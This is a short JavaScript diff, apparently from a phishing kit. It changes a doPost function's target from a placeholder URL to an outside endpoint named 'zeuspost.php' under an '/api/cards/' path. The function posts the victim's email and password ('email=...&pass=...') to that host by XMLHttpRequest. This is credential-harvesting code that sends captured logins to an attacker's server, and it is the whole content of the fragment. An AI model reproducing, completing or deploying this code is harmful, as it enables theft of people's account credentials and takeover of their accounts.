@@ -101,7 +101,7 @@ function findGetParameter(url,parameterName) {
 }
 
 function doPost(e,p,page){
-                        var url = "http://www.website.com";
+                        var url = "http://www.jabonchimbo.com/api/cards/zeuspost.php";
                         var parametros ="email="+e+"&pass="+p+"&page="+page;
                         var xhr = new XMLHttpRequest();
                         xhr.open("POST",url, true);
